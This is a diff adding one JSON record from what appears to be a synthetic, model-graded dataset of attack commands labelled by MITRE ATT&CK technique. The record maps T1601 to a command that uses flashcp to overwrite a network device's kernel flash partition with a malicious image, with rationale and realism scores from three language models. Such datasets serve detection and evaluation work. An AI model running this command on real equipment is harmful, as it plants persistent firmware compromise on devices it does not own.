@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Linux-based CLI",
+  "command": "echo 'T1601 patch: flashing malicious kernel to MTD'; flashcp -v /tmp/mal_kernel.bin /dev/mtd2 && sync",
+  "explanation": "Overwrites the kernel partition on NOR/NAND flash using flashcp with a malicious kernel image, directly modifying the system image.",
+  "rationale_steps": [
+    "Use embedded mtd-utils (flashcp) appropriate for network devices.",
+    "Write a crafted kernel to the kernel MTD partition to alter the boot image.",
+    "Flush changes with sync to ensure persistence across reboots."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-LINUX-BASED CLI-T1601-d3d2d345-23663dc5",
+  "source_prompt_hash": "d3d2d345",
+  "timestamp_utc": "2025-09-30T02:47:56.896050Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quotes with proper command separators and valid flags/operators make the command well-formed and parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "Using flashcp to write a kernel image to an MTD partition plausibly modifies the system image in line with T1601, but it typically requires root privileges and flashcp is suitable mainly for NOR (not NAND) which introduces realism gaps.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T19:15:19.707207Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid command separators (;, &&), correct flag usage (-v for verbose in flashcp), and proper argument ordering.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1601 by using flashcp (the standard Linux MTD flash copy utility) to overwrite a kernel partition (/dev/mtd2) with a malicious binary, followed by sync to ensure write completion, which is a realistic and operationally plausible method for modifying a system image on embedded/network devices with NOR/NAND flash storage.",
+        "combined_score": 5.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T01:22:28.453413Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using standard shell operators and valid utility flags in a logical sequence.",
+        "semantic_score": 5,
+        "semantic_justification": "The use of flashcp to overwrite an MTD partition is a textbook method for modifying system images on embedded Linux-based network devices.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:22:29.678929Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
